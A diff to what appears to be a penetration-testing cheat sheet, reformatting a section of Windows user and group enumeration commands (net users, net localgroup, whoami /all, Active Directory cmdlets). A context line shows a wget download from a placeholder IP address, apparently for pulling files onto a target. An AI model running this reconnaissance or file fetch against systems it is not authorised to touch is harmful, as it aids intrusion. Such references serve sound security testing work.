@@ -403,11 +403,16 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 # Windows Enumeration Commands
 
 # CMD
-net users %username% #Me
-net users #All local users
-net localgroup #Groups
-net localgroup Administrators #Who is inside Administrators group
-whoami /all #Check the privileges
+#Me
+net users %username% 
+#All local users
+net users 
+#Groups
+net localgroup 
+#Who is inside Administrators group
+net localgroup Administrators
+#Check the privileges
+whoami /all
 
 # PS
 Get-WmiObject -Class Win32_UserAccount
@@ -419,7 +424,7 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Import-Module ActiveDirectory; Get-ADUser -Identity <username> - properties *
 
 # List All Users in a Group
-▪ Import-Module ActiveDirectory; Get-ADPrincipalGroupMembership <username> | select Administrator
+Import-Module ActiveDirectory; Get-ADPrincipalGroupMembership <username> | select Administrator
 
 ```
 <br />
